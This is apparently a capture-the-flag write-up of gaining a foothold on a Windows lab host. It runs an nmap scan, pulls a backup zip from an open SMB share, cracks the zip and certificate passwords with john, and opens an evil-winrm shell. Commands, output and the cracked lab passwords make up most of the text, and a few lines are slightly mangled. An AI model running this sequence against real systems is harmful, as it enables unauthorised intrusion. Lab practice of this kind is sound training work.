
#### Foothold

I start with running nmap, to find all the open ports on the victim's ip:

```
nmap -p- --min-rate=1000 -T4 {target_ip}
```

I get a long list of ip addresses and run them with the `-sC` and `-sV` flags

```
nmap -p[port1],[port2],[port...] -sC -sV {target ip}
```

I see that port `445` is open using the SMB protocol.

I check the open shares with:

```
smbclient -L //{target ip}/
```

I see the `Shares` is open, I login:

```
$ smbclient //10.10.11.152/Shares

$ cd /Dev

$ get winrm_backup.zip
```

I get the zip file on my local and run the following commands:

```
$ zip2john winrm_backup.zip > zip.john
$ john zip.john -wordlist:/usr/share/wordlists/rockyou.txt
$ winrm_backup.zip/legacyy_dev_auth.pfx
$ $ unzip -P supremelegacy winrm_backup.zip
Archive:  winrm_backup.zip
  inflating: legacyy_dev_auth.pfx
$ python /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
$ john pfx.john -wordlist:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:31 DONE (2024-10-27 14:45) 0.03136g/s 101372p/s 101372c/s 101372C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
thuglegacy
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
thuglegacy
$ evil-winrm -i 10.129.227.113 -c cert.pem -k key.pem -S
                                        
Evil-WinRM shell v3.5
...

*Evil-WinRM* PS C:\Users\legacyy\Documents>
```



